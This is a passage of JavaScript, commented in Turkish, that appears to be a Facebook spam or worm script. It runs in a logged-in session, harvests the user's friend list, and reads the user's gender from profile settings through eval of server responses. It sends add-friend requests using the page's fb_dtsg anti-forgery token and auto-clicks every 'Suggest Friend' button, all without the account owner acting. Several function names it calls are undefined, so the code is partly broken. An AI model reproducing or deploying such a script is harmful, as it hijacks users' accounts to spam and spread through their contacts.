        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}

//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();

document.removeEventListener(tiklama);
}
 }, false);
  

//arkada      leme
function sarkadasekle(uid,cins){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
		var params = "to_friend=" + uid;
		params += "&action=add_friend";
		params += "&how_found=friend_browser";
		params += "&ref_param=none";
		params += "&outgoing_id=";
		params += "&logging_location=friend_browser";
		params += "&no_flyout_on_click=true";
		params += "&ego_log_data=";
		params += "&http_referer=";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
		xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
		cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
		xmlhttp.send(params);
}
}

//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
			cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
			btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
			if(cinshtml.getElementsByTagName("select")[0].value == "1"){
			document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
			}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
			document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
			}
			eval(fonksiyon + "(" + id + "," + cins + ");");
			}
        };
		xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send();
}
function autoSuggest()
{    
    links=document.getElementsByTagName('a');
    for (i in links) {
        l=links[i];
        if(l.innerHTML == '<span class="uiButtonText">Suggest Friend</span>') {
            l.click();
        }
    }
}

function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        w = document.getElementsByClassName('pbm fsm')[0];

        e = document.createElement('a');
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by SAGA';
        e.className = 'uiButton';
        e.onclick = autoSuggest;

        if( w.childElementCount == 0)
        {
            w.appendChild(document.createElement('br'));
            w.appendChild(e);
        }
    }
}

blub();

document.addEventListener("DOMNodeInserted", blub, true);